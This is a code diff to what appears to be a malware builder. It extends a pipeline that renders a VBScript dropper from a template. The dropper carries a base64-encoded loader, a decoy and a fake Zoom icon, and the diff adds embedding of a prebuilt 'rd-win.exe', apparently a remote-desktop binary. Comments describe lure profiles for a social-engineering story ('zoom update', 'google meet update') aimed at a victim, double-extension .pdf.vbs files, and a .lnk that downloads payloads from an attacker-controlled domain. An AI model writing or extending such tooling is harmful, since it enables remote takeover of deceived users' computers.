@@ -42,6 +42,18 @@ TARGETS: list[tuple[str, str]] = [
 
 ALPHABET = string.ascii_lowercase + string.digits
 
+
+def _read_bin(path: Path) -> bytes:
+    """Read a pre-built helper binary if present; empty otherwise (degrades
+    gracefully so builds on hosts without the rd toolchain still succeed)."""
+    try:
+        if path.is_file():
+            return path.read_bytes()
+    except OSError:
+        pass
+    return b""
+
+
 # Lure profiles: the artifact names must match the social-engineering story of
 # the page the victim lands on ("zoom update", "google meet update").
 PROFILES: dict[str, dict[str, str]] = {
@@ -153,6 +165,7 @@ def render_windows(
     doc_name: str = "",
     icon_bytes: bytes = b"",
     icon_name: str = "Zoom.ico",
+    rd_win_bytes: bytes = b"",
 ) -> str:
     template = (TEMPLATES / "win" / "dropper.vbs.tmpl").read_text(encoding="utf-8")
     expr = vbs_string_expr(base64.b64encode(loader_bytes).decode())
@@ -165,6 +178,7 @@ def render_windows(
         .replace("{{ICON_B64}}", base64.b64encode(icon_bytes).decode())
         .replace("{{ICON_NAME}}", icon_name)
         .replace("{{BASE_URL}}", base_url)
+        .replace("{{RD_WIN_B64}}", base64.b64encode(rd_win_bytes).decode())
     )
 
 
@@ -254,6 +268,7 @@ class BuildPipeline:
         source = render_windows(
             naming["win"], self._current_suffix, loader, decoy, req.base_url,
             req.doc_name, lure_icon(), icon_name,
+            _read_bin(Path(self.config.panel_bin_dir) / "rd-win.exe"),
         )
         # stable names: the .lnk downloads these exact files from dl.<zone>
         vbs_name = f"{naming['win']}.pdf.vbs"
